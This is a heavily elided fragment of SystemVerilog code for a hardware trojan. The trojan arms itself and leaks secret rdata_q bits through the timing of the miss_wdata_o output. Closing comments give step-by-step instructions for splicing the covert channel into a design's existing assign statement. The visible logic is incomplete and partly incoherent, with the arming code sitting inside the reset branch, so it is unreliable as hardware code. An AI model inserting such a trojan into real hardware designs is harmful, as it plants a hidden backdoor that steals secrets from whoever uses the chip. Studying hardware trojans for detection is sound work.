 ...
 * Payload: Modulate miss_wdata_o timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |miss_wdata_o) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of miss_wdata_o:
...
logic       covert_bit_out;         // Drives miss_wdata_o when trojan active
...
//   Find the assign for miss_wdata_o (or rd_error_o as fallback):
//     assign miss_wdata_o = <normal_expr>;
//   Replace with:
//     assign miss_wdata_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
